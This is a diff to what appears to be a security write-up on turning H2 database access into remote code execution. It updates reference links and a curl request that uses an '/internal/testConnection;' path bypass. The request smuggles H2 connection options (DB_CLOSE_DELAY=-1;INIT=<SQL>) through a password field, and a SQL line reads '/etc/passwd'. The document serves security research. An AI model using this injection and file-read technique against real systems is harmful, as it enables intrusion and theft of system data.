@@ -8,9 +8,11 @@
 
 {% embed url="https://www.h2database.com/html/features.html" %}
 
-{% embed url="https://www.baeldung.com/java-h2-executing-sql-scripts" %}
-
 {% embed url="https://www.h2database.com/html/grammar.html" %}
+
+{% embed url="https://www.baeldung.com/spring-boot-h2-database" %}
+
+{% embed url="https://www.baeldung.com/java-h2-executing-sql-scripts" %}
 
 #### 2. SQL to RCE
 
@@ -127,7 +129,7 @@ Hence, if we send a request to the `/internal/testConnection\0x09` or `/internal
 
 {% code overflow="wrap" %}
 ```sh
-$ curl -X POST "http://<target>/internal/testConnection;" -H "Cookie: JSESSIONID=xxxx" -H "content-type: application/json" -d "username=sa&password=;INIT=<SQL>;"
+$ curl -X POST "http://<target>/internal/testConnection;" -H "Cookie: JSESSIONID=xxxx" -H "content-type: application/json" -d "username=sa&password=;DB_CLOSE_DELAY=-1;INIT=<SQL>;"
 ```
 {% endcode %}
 
@@ -140,4 +142,8 @@ SELECT load_file("/etc/passwd") from information_schema
 
 ```
 {% endcode %}
+
+* `DB_CLOSE_DELAY = -1`&#x20;
+
+> This option ensures the database remains open as long as the Java Virtual Machine (JVM) is running. It prevents it from closing automatically when the last connection is closed. By default, the database closes when the last connection is terminated. The default value is zero. However, it’s essential to shut down the database with a shutdown command to avoid potential memory leaks.
 
